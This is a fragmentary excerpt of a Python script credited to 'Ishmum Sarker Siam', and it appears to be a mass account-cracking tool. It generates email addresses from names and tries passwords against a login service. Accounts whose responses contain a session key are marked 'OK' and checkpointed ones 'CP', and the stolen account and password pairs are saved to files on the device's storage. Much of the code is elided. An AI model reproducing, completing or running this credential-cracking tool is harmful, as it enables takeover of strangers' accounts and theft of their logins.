...
\033[1;97m Owner  :  Ishmum Sarker Siam :/

\033[1;97m GitHub :  ishmum  Sarker Siam :/
...
def ISS_Main():
    ...
    if inpp == "4":
     ...
     os.system('cd && git clone --depth=1 https://github.com/Ishmum-404/FILE')
...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            ...
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' ISS-code=Ishmum-33'))
    ...
    if len(game)==0:
        ...
        for gm in game:
            ...
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','ISS-182^)Code=Ishmum-2233]'))

####@-----Gmail-----@####

def gmail():     

        os.system('rm -rf .Ishmum')
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.Ishmum','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            ...
            fo = open('.Ishmum', 'r').read().splitlines()
...
def method():
    ...
    def start(user):
     ...
     try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97mISS-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
      ...
      #      print(response.text)
            ...
            if 'session_key' in response.text:
                ...
                print('\r\033[1;92m[\033[1;97mIshmum-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')

                open('/sdcard/Ishmum-OK.txt','a').write(f'{acc} • {pword}\n')
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mIshmum-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')

                cpacc.append(acc)

                open('/sdcard/Ishmum-CP.txt','a').write(f'{acc} • {pword}\n')
    ...
    def start2(user):
      ...
      try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;97mISS-M2\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
...
def andom():
    ...
    print(f"{oo('•')}/sdcard/Ishmum-OK.txt")
